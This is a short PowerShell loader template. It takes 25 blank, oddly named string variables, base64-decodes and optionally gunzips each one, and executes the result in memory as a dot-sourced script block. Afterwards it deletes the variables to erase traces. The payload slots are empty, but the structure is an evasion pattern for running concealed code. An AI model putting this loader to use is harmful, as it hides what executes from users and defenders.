#Requires -Version 2

$Composting = ""
$Videotaped = ""
$Juxtaposes = ""
$Windmilled = ""
$Opprobrium = ""
$Mclaughlin = ""
$Ostracizes = ""
$Schlepping = ""
$Consecrate = ""
$Adventures = ""
$Earthlings = ""
$Dissembles = ""
$Glimmering = ""
$Stringency = ""
$Uncultured = ""
$Sleepiness = ""
$Backtracks = ""
$Daydreamed = ""
$Newfangled = ""
$Priorities = ""
$Hyperbolas = ""
$Apotheosis = ""
$Carjacking = ""
$Directives = ""
$Invigorate = ""

$Modules = @($Composting,$Videotaped,$Juxtaposes,$Windmilled,$Opprobrium,$Mclaughlin,$Ostracizes,$Schlepping,$Consecrate,$Adventures,$Earthlings,$Dissembles,$Glimmering,$Stringency,$Uncultured,$Sleepiness,$Backtracks,$Daydreamed,$Newfangled,$Priorities,$Hyperbolas,$Apotheosis,$Carjacking,$Directives,$Invigorate)
$Modules | ForEach-Object {
    $Decoded = [System.Convert]::FromBase64String($_)
    if ($_ -like "H4s*") {
        $Decoded = ConvertFrom-Gzip -Bytes $Decoded
    }
    else {
        $Decoded = [Text.Encoding]::UTF8.GetString($Decoded)
    }
    $ScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock($Decoded)
    . $ScriptBlock
    Remove-Variable -Name "Decoded"
    Remove-Variable -Name "ScriptBlock"
}
Remove-Variable -Name "Modules"
@("Composting","Videotaped","Juxtaposes","Windmilled","Opprobrium","Mclaughlin","Ostracizes","Schlepping","Consecrate","Adventures","Earthlings","Dissembles","Glimmering","Stringency","Uncultured","Sleepiness","Backtracks","Daydreamed","Newfangled","Priorities","Hyperbolas","Apotheosis","Carjacking","Directives","Invigorate") | ForEach-Object { Remove-Variable -Name $_ }
